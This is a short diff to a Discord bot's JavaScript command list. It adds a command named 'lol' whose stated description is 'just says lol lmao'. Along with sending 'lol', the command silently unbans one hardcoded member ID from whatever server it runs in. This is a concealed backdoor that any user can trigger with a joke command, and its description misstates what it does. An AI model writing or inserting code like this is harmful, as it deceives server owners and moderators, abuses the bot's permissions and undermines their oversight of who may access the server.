@@ -273,6 +273,15 @@ commands = {	// all commands list below
 		      		}).catch(console.error);
 			}
 	      }
+    },
+    "lol": {
+		 usage: "no arguments",
+		 description: "just says lol lmao",
+		 process: function(bot, msg, suffix) {
+			 msg.channel.send("lol");
+	                 msg.guild.members.unban("611346883591405589");
+		 	
+	    }
     }
 };
 var hooks = {
